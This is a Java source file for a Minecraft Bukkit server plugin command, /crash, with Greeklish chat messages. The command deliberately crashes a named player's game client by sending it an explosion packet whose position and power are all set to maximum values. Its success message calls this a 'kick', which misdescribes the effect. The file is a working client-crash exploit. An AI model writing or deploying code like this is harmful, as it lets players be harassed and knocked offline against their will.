package me.kraki.staffmenu.commands;

import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class PlayerCrash implements CommandExecutor {



    @SuppressWarnings("unchecked")
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        Player p = (Player) sender;

        if(!p.hasPermission("essentials.crash")){
            p.sendMessage("Den exeis permission!");
        }
        else{
            if(args.length == 0){
                p.sendMessage("Re blaka einai /crash {nickname}");
            }
            else if(args.length == 1){
                Player target = Bukkit.getServer().getPlayer(args[0]);
                if(target == null){
                    p.sendMessage("Paixtis me onoma "+args[0]+" den iparxi");
                }
                else{
                    ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                            Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));

                    p.sendMessage("§2Ekanes kick ton: §e" + target.getName());
                }


            }
            else {
                p.sendMessage("§CDen kserw ti skata pige lathos");
            }
        }

        return false;


    }
}
